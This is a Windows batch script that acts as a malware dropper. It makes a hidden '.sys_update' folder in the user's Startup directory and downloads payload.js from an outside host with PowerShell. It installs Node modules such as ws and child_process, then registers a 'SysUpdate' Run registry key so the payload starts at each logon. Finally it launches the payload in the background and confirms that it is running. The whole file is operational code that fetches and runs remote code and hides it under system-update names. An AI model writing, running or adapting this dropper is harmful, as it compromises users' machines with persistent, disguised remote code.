@echo off
setlocal enabledelayedexpansion

:: --- CONFIGURATION ---
set "DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\.sys_update"
set "PAYLOAD_URL=https://payloadea.onrender.com/payload.js"
set "LOCAL_PAYLOAD=%DIR%\payload.js"
set "LOG_FILE=%DIR%\install.log"

:: Clear previous logs for a clean slate
if exist "%LOG_FILE%" del "%LOG_FILE%"

echo [INIT] Starting installation... > "%LOG_FILE%"

:: --- STEP 1: Ensure Directory Exists ---
if not exist "%DIR%" mkdir "%DIR%" 2>nul
cd /d "%DIR%"

:: --- STEP 2: Download Latest Payload ---
echo [STEP 1] Downloading payload... >> "%LOG_FILE%"
powershell -Command "Invoke-WebRequest -Uri '%PAYLOAD_URL%' -OutFile '%LOCAL_PAYLOAD%'" >> "%LOG_FILE%" 2>&1

if not exist "%LOCAL_PAYLOAD%" (
    echo [ERROR] File missing after download. >> "%LOG_FILE%"
    exit /b 1
)

for %%F in ("%LOCAL_PAYLOAD%") do if %%~zF==0 (
    echo [ERROR] Downloaded file is empty. >> "%LOG_FILE%"
    del "%LOCAL_PAYLOAD%"
    exit /b 1
)

:: --- STEP 3: Install Dependencies ---
echo [STEP 2] Installing dependencies... >> "%LOG_FILE%"
call npm install ws child_process fs os path https http crypto >> "%LOG_FILE%" 2>&1

if %errorlevel% neq 0 (
    echo [ERROR] npm install failed. Check %LOG_FILE% >> "%LOG_FILE%"
    exit /b 1
)

:: --- STEP 4: Find Node.js ---
where node >nul 2>&1
if %errorlevel% neq 0 (
    if exist "C:\Program Files\nodejs\node.exe" set "NODE=C:\Program Files\nodejs\node.exe"
    if exist "C:\Users\%USERNAME%\AppData\Local\Programs\Node.js\node.exe" set "NODE=C:\Users\%USERNAME%\AppData\Local\Programs\Node.js\node.exe"
    if defined NODE (
        echo [INFO] Found Node at: %NODE% >> "%LOG_FILE%"
    ) else (
        echo [ERROR] Node.js not found. >> "%LOG_FILE%"
        exit /b 1
    )
) else (
    set "NODE=node"
    echo [INFO] Using Node from PATH: %NODE% >> "%LOG_FILE%"
)

:: --- STEP 5: Register Persistence ---
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdate" /t REG_SZ /d "cmd /c start \"\" /b \"%NODE%\" \"%LOCAL_PAYLOAD%\"" /f

:: --- STEP 6: Execute Payload Immediately ---
echo [STEP 3] Launching payload... >> "%LOG_FILE%"
start "" /b "%NODE%" "%LOCAL_PAYLOAD%" >> "%LOG_FILE%" 2>&1

:: --- STEP 7: Robust Verification Loop ---
echo [STEP 4] Verifying execution... >> "%LOG_FILE%"
set "PID="
set "Found=0"
for /l %%i in (1,1,10) do (
    timeout /t 1 /nobreak >nul
    for /f "tokens=5" %%a in ('tasklist /FI "IMAGENAME eq node.exe" /FO CSV ^| findstr /i "payload.js"') do set "PID=%%a"
    if defined PID (
        set "Found=1"
        goto :VERIFY_SUCCESS
    )
)

:VERIFY_SUCCESS
if defined PID (
    echo [SUCCESS] Payload running with PID: %PID%
    echo [SUCCESS] Installation Complete. >> "%LOG_FILE%"
) else (
    echo [FAILED] Payload not detected. Check %LOG_FILE% for JS errors.
    echo [FAILED] Installation Failed. >> "%LOG_FILE%"
)

exit
